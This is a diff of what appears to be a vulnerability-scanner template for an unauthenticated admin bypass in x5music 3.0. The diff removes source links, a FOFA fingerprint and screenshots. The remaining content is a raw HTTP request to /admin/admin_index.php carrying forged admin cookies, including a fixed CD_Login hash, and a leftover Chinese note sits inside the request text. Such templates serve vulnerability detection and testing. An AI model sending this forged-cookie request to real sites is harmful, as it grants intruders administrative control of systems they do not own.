@@ -3,12 +3,8 @@ info:
   name: x5music3.0 admin_index.php 后台权限绕过漏洞_dywbg8gkigtokp9d
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  description: ''
   tags: unauth,unknown
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ''
-    fofa: body="/plug/asynctips/asyncbox.v1.4.5.js"
 http:
 - raw:
   - 'GET /admin/admin_index.php HTTP/1.1
@@ -17,11 +13,8 @@ http:
 
     Cookie:CD_AdminID=1;CD_Permission=1;CD_Login=6512bd43d9caa6e02c990b0a82652dca
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739185654200-b7f2fe98-9d0b-4a5a-b780-7d9a05f60cd9.png)
 
-    写入cookie后
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1739185654437-3b1a8c9a-6e07-462a-886e-489b43d8ccdd.png)'
+    写入cookie后'
   redirects: false
   matchers:
   - status:
